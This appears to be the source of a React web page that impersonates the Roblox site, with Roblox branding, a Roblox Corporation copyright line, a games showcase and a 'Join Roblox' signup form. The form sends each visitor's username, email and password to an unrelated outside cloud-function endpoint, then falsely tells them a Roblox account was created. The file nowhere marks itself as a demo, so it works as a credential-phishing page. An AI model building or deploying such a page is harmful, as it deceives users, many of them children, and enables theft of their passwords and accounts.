import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card } from '@/components/ui/card';
import { useToast } from '@/hooks/use-toast';
import Icon from '@/components/ui/icon';

const Index = () => {
  const { toast } = useToast();
  const [formData, setFormData] = useState({
    username: '',
    email: '',
    password: ''
  });
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      const response = await fetch('https://functions.poehali.dev/dc09bade-aa8a-41d7-87df-0f7ae1969e91', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });

      if (response.ok) {
        toast({
          title: "Welcome to Roblox!",
          description: "Your account has been created successfully.",
        });
        setFormData({ username: '', email: '', password: '' });
      } else {
        throw new Error('Registration failed');
      }
    } catch (error) {
      toast({
        title: "Error",
        description: "Something went wrong. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const games = [
    { title: 'Adopt Me!', players: '600K', icon: '🏠' },
    { title: 'Brookhaven', players: '500K', icon: '🏘️' },
    { title: 'Tower of Hell', players: '100K', icon: '🗼' },
    { title: 'Blox Fruits', players: '450K', icon: '🍊' },
    { title: 'Pet Simulator', players: '200K', icon: '🐾' },
    { title: 'Murder Mystery', players: '150K', icon: '🔪' }
  ];

  return (
    <div className="min-h-screen bg-[#393B3D]">
      <header className="bg-white shadow-sm sticky top-0 z-50">
        <div className="container mx-auto px-4">
          <div className="flex items-center justify-between h-14">
            <div className="flex items-center gap-8">
              <div className="flex items-center gap-2">
                <div className="w-8 h-8 bg-black rounded flex items-center justify-center">
                  <span className="text-white font-black text-sm">R</span>
                </div>
                <span className="font-black text-lg">Roblox</span>
              </div>
              <nav className="hidden lg:flex items-center gap-6">
                <a href="#" className="text-sm font-bold text-gray-700 hover:text-black transition flex items-center gap-1">
                  <Icon name="Compass" size={16} />
                  Discover
                </a>
                <a href="#" className="text-sm font-bold text-gray-700 hover:text-black transition flex items-center gap-1">
                  <Icon name="ShoppingBag" size={16} />
                  Avatar Shop
                </a>
                <a href="#" className="text-sm font-bold text-gray-700 hover:text-black transition flex items-center gap-1">
                  <Icon name="Sparkles" size={16} />
                  Create
                </a>
                <a href="#" className="text-sm font-bold text-gray-700 hover:text-black transition flex items-center gap-1">
                  <Icon name="DollarSign" size={16} />
                  Robux
                </a>
              </nav>
            </div>
            <div className="flex items-center gap-2">
              <div className="hidden md:block relative">
                <Icon name="Search" size={18} className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" />
                <input 
                  type="text" 
                  placeholder="Search" 
                  className="pl-10 pr-4 py-1.5 rounded-lg border border-gray-300 text-sm w-48 focus:outline-none focus:border-gray-400"
                />
              </div>
              <Button variant="ghost" size="sm" className="text-sm font-bold">
                Log In
              </Button>
              <Button size="sm" className="bg-black hover:bg-gray-800 text-white text-sm font-bold px-4 rounded-lg">
                Sign Up
              </Button>
            </div>
          </div>
        </div>
      </header>

      <main>
        <section className="bg-gradient-to-br from-[#00A0FF] via-[#00D4FF] to-[#7B5FFF] py-16 md:py-24 relative overflow-hidden">
          <div className="absolute inset-0 opacity-10">
            <div className="absolute top-10 left-10 w-32 h-32 bg-white rounded-full blur-3xl" />
            <div className="absolute bottom-10 right-10 w-40 h-40 bg-purple-300 rounded-full blur-3xl" />
          </div>
          
          <div className="container mx-auto px-4 relative z-10">
            <div className="max-w-7xl mx-auto grid lg:grid-cols-2 gap-12 items-center">
              <div className="text-white">
                <h1 className="text-5xl md:text-7xl font-black mb-6 leading-tight">
                  Reimagine the way people come together
                </h1>
                <p className="text-xl md:text-2xl mb-8 text-white/95 leading-relaxed">
                  Roblox is the ultimate virtual universe that lets you create, share experiences with friends, and be anything you can imagine.
                </p>
                <Button 
                  size="lg" 
                  className="bg-white text-black hover:bg-gray-100 font-black text-lg px-10 h-14 rounded-xl shadow-2xl"
                  onClick={() => document.getElementById('signup-section')?.scrollIntoView({ behavior: 'smooth' })}
                >
                  Get Started
                </Button>
              </div>
              <div className="relative">
                <div className="relative rounded-2xl overflow-hidden shadow-2xl">
                  <img 
                    src="/img/f889dedd-fae3-43cd-a5d6-fa8508822805.jpg" 
                    alt="Roblox Universe" 
                    className="w-full h-auto"
                  />
                </div>
              </div>
            </div>
          </div>
        </section>

        <section className="py-16 bg-white">
          <div className="container mx-auto px-4">
            <div className="flex items-center justify-between mb-8">
              <div>
                <h2 className="text-3xl md:text-4xl font-black text-gray-900">Popular Games</h2>
                <p className="text-gray-600 mt-1">Join millions playing right now</p>
              </div>
              <Button variant="ghost" className="font-bold flex items-center gap-1">
                See All
                <Icon name="ChevronRight" size={18} />
              </Button>
            </div>
            
            <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-4">
              {games.map((game, idx) => (
                <Card 
                  key={idx} 
                  className="group cursor-pointer overflow-hidden border-0 shadow-md hover:shadow-xl transition-all duration-300 hover:-translate-y-1"
                >
                  <div className="aspect-square bg-gradient-to-br from-blue-400 to-purple-500 flex items-center justify-center text-6xl relative overflow-hidden">
                    <div className="absolute inset-0 bg-black/0 group-hover:bg-black/10 transition" />
                    {game.icon}
                  </div>
                  <div className="p-3">
                    <h3 className="font-bold text-sm mb-1 truncate">{game.title}</h3>
                    <div className="flex items-center gap-1 text-xs text-gray-600">
                      <div className="w-2 h-2 bg-green-500 rounded-full" />
                      <span>{game.players} playing</span>
                    </div>
                  </div>
                </Card>
              ))}
            </div>
          </div>
        </section>

        <section className="py-16 bg-gray-50">
          <div className="container mx-auto px-4">
            <div className="text-center mb-12">
              <h2 className="text-3xl md:text-5xl font-black mb-4">Create Anything You Can Imagine</h2>
              <p className="text-xl text-gray-600 max-w-2xl mx-auto">
                Build immersive 3D experiences with Roblox Studio, our free and accessible development tool
              </p>
            </div>
            
            <div className="grid md:grid-cols-3 gap-6 max-w-5xl mx-auto">
              {[
                { 
                  icon: 'Paintbrush', 
                  title: 'Design', 
                  desc: 'Create stunning 3D worlds and customize every detail',
                  color: 'from-pink-500 to-rose-500'
                },
                { 
                  icon: 'Code', 
                  title: 'Code', 
                  desc: 'Bring your creations to life with Lua scripting',
                  color: 'from-blue-500 to-cyan-500'
                },
                { 
                  icon: 'Rocket', 
                  title: 'Publish', 
                  desc: 'Share your experience with millions worldwide',
                  color: 'from-purple-500 to-indigo-500'
                }
              ].map((item, idx) => (
                <Card key={idx} className="p-8 border-0 shadow-lg hover:shadow-xl transition group">
                  <div className={`w-14 h-14 rounded-2xl bg-gradient-to-br ${item.color} flex items-center justify-center mb-6 group-hover:scale-110 transition`}>
                    <Icon name={item.icon as any} className="text-white" size={28} />
                  </div>
                  <h3 className="text-2xl font-black mb-3">{item.title}</h3>
                  <p className="text-gray-600 leading-relaxed">{item.desc}</p>
                </Card>
              ))}
            </div>
          </div>
        </section>

        <section id="signup-section" className="py-20 bg-white">
          <div className="container mx-auto px-4">
            <div className="max-w-md mx-auto">
              <div className="text-center mb-8">
                <h2 className="text-4xl font-black mb-3">Join Roblox</h2>
                <p className="text-gray-600">Sign up and start exploring endless possibilities</p>
              </div>
              
              <Card className="p-8 shadow-2xl border-0 rounded-2xl bg-white">
                <form onSubmit={handleSubmit} className="space-y-5">
                  <div>
                    <label className="block text-sm font-bold mb-2 text-gray-800">
                      Username
                    </label>
                    <Input
                      type="text"
                      value={formData.username}
                      onChange={(e) => setFormData({ ...formData, username: e.target.value })}
                      required
                      className="h-12 border-2 border-gray-200 focus:border-black focus:ring-black rounded-lg text-base"
                      placeholder="Pick your username"
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-bold mb-2 text-gray-800">
                      Email Address
                    </label>
                    <Input
                      type="email"
                      value={formData.email}
                      onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                      required
                      className="h-12 border-2 border-gray-200 focus:border-black focus:ring-black rounded-lg text-base"
                      placeholder="your@email.com"
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-bold mb-2 text-gray-800">
                      Password
                    </label>
                    <Input
                      type="password"
                      value={formData.password}
                      onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                      required
                      className="h-12 border-2 border-gray-200 focus:border-black focus:ring-black rounded-lg text-base"
                      placeholder="Create a strong password"
                    />
                  </div>

                  <Button
                    type="submit"
                    disabled={isLoading}
                    className="w-full h-13 bg-black hover:bg-gray-800 text-white font-black text-base rounded-lg mt-6 transition"
                  >
                    {isLoading ? 'Creating Your Account...' : 'Sign Up'}
                  </Button>

                  <div className="text-center pt-4">
                    <p className="text-sm text-gray-600">
                      Already have an account?{' '}
                      <a href="#" className="text-black font-bold hover:underline">
                        Log In
                      </a>
                    </p>
                  </div>
                </form>
              </Card>
              
              <p className="text-xs text-center text-gray-500 mt-6 leading-relaxed">
                By signing up, you agree to our Terms of Service and Privacy Policy
              </p>
            </div>
          </div>
        </section>
      </main>

      <footer className="bg-white border-t py-12">
        <div className="container mx-auto px-4">
          <div className="grid grid-cols-2 md:grid-cols-4 gap-8 mb-10">
            <div>
              <h4 className="font-black mb-4 text-sm text-gray-900">About</h4>
              <ul className="space-y-2.5 text-sm text-gray-600">
                <li><a href="#" className="hover:text-black font-semibold">About Us</a></li>
                <li><a href="#" className="hover:text-black font-semibold">Careers</a></li>
                <li><a href="#" className="hover:text-black font-semibold">News</a></li>
                <li><a href="#" className="hover:text-black font-semibold">Blog</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-black mb-4 text-sm text-gray-900">Help</h4>
              <ul className="space-y-2.5 text-sm text-gray-600">
                <li><a href="#" className="hover:text-black font-semibold">Customer Support</a></li>
                <li><a href="#" className="hover:text-black font-semibold">Safety</a></li>
                <li><a href="#" className="hover:text-black font-semibold">Parents</a></li>
                <li><a href="#" className="hover:text-black font-semibold">Community Standards</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-black mb-4 text-sm text-gray-900">Developers</h4>
              <ul className="space-y-2.5 text-sm text-gray-600">
                <li><a href="#" className="hover:text-black font-semibold">Roblox Studio</a></li>
                <li><a href="#" className="hover:text-black font-semibold">Documentation</a></li>
                <li><a href="#" className="hover:text-black font-semibold">DevForum</a></li>
                <li><a href="#" className="hover:text-black font-semibold">Talent Hub</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-black mb-4 text-sm text-gray-900">Social</h4>
              <div className="flex gap-3">
                {['Twitter', 'Youtube', 'Facebook', 'Instagram'].map((social) => (
                  <a 
                    key={social}
                    href="#" 
                    className="w-9 h-9 bg-gray-100 rounded-lg flex items-center justify-center hover:bg-gray-200 transition"
                  >
                    <Icon name={social as any} size={16} />
                  </a>
                ))}
              </div>
            </div>
          </div>
          <div className="border-t pt-8 flex flex-col md:flex-row justify-between items-center gap-4">
            <div className="flex items-center gap-2">
              <div className="w-6 h-6 bg-black rounded flex items-center justify-center">
                <span className="text-white font-black text-xs">R</span>
              </div>
              <span className="font-black text-sm">© 2025 Roblox Corporation</span>
            </div>
            <div className="flex gap-6 text-xs font-semibold text-gray-600">
              <a href="#" className="hover:text-black">Privacy</a>
              <a href="#" className="hover:text-black">Terms</a>
              <a href="#" className="hover:text-black">Accessibility</a>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Index;
